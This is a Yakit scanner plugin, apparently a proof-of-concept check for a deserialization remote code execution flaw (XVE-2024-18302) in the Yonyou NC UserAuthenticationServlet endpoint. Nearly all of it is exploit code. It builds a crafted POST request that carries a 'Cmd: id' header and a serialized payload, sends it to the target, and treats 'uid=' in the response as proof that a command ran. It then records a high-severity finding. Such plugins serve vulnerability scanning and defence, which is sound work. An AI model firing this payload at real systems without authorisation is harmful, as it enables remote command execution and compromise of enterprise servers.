# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet HTTP/1.1
Host: {{params(target)}}
Cmd: id
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{{hexdec()}}

`


    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if !str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
		return
	}

	rsp1,req1,_ = poc.HTTP(packet1, 
		poc.params({"target":addr}),
		poc.https(isTls),
		poc.redirectTimes(0),
	)
	if !str.MatchAllOfSubString(rsp1, `uid=`){
		return
	}

    yakit.Info("%v found 用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)", addr)
    	risk.NewRisk(
    	addr,
        risk.title("用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)"),
        risk.severity("high"),
        risk.titleVerbose("用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
